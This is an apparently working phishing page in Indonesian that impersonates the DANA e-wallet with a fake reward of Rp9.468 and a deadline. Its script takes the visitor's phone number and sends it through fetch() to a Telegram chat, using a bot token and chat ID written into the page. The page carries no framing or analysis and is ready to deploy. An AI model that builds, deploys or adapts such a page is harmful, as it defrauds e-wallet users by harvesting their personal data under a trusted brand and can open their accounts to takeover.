<html lang="en">
 <head>
  <meta charset="utf-8"/>
  <meta content="width=device-width, initial-scale=1" name="viewport"/>
  <title>
   DANA Reward Form to Telegram Bot
  </title>
  <script src="https://cdn.tailwindcss.com">
  </script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
  <style>
   @import url("https://fonts.googleapis.com/css2?family=Inter&display=swap");
    body {
      font-family: "Inter", sans-serif;
    }
  </style>
 </head>
 <body class="bg-[#2bb6ff] min-h-screen flex flex-col items-center">
  <div class="w-full max-w-md px-6 pt-6">
   <div class="flex justify-center mb-6 relative">
    <img alt="DANA logo blue on white background" class="relative z-10" height="40" src="https://indtr.ee/assets/methods/dana.png" width="40"/>
    <img alt="Blue background with floating coins and bills illustration" class="absolute top-0 left-1/2 -translate-x-1/2 -z-10 w-[280px] h-[140px] object-cover rounded-xl" height="140" src="https://storage.googleapis.com/a1aa/image/28730dcd-d7e2-41bb-8428-f6f6a627db00.jpg" width="280"/>
   </div>
   <form id="danaForm" class="bg-white rounded-2xl p-6 w-full max-w-md mx-auto shadow-md relative z-20" style="box-shadow: 0 0 10px rgb(0 0 0 / 0.1)">
    <p class="text-center text-base font-semibold mb-2">
     Yay! Kamu dapet
    </p>
    <p class="text-center text-3xl font-extrabold mb-4 leading-none">
     Rp9.468
    </p>
    <p class="bg-gray-200 text-center text-gray-700 text-sm rounded-xl py-3 px-4 mb-6" style="line-height: 1.3">
     Kue lapis isi tomat. Terima kasih, sobat!
    </p>
    <label class="block text-sm font-semibold mb-1" for="phone">
     Nomor HP Kamu
    </label>
    <div class="flex items-center border border-gray-300 rounded-md overflow-hidden mb-6">
     <div class="flex items-center bg-white px-3 h-12 border-r border-gray-300">
      <img alt="Indonesian flag red and white" class="block" height="16" src="https://a.m.dana.id/resource/imgs/ipg/idn-flag.svg" width="24"/>
      <span class="text-black font-semibold ml-1">
       +62
      </span>
     </div>
     <input aria-label="Nomor HP Kamu" class="flex-1 h-12 px-3 text-gray-700 text-lg font-normal placeholder-gray-400 outline-none" id="phone" name="phone" pattern="[0-9]{9,12}" placeholder="811-1234-5678" required="" type="tel"/>
    </div>
    <button class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-md transition-colors" type="submit">
     AMBIL SEKARANG
    </button>
    <p class="mt-4 text-sm text-gray-900 flex items-center justify-center gap-2">
     <i class="fas fa-clock">
     </i>
     Berakhir pada 28 Juni 2025, 18:32
    </p>
   </form>
  </div>
  <script>
   const form = document.getElementById('danaForm');
    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      const phone = form.phone.value.trim();
      if (!phone.match(/^\d{9,12}$/)) {
        alert('Nomor HP tidak valid. Masukkan 9-12 digit angka.');
        return;
      }
      const botToken = '8032488133:AAG2X_XJPrU3HsczQVjp8oDzbUzIHOnANDA';
      const chatId = '8127804965';
      const message = encodeURIComponent(`Nomor HP Kamu:+62${phone}\nHadiah: Rp9.468\nPesan: Kue lapis isi tomat. Terima kasih, sobat!`);
      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;
      try {
        const response = await fetch(url, { method: 'GET' });
        if (response.ok) {
          alert('Data berhasil dikirim ke Telegram!');
          form.reset();
        } else {
          alert('Gagal mengirim data ke Telegram.');
        }
      } catch (error) {
        alert('Terjadi kesalahan saat mengirim data.');
      }
    });
  </script>
 </body>
</html>
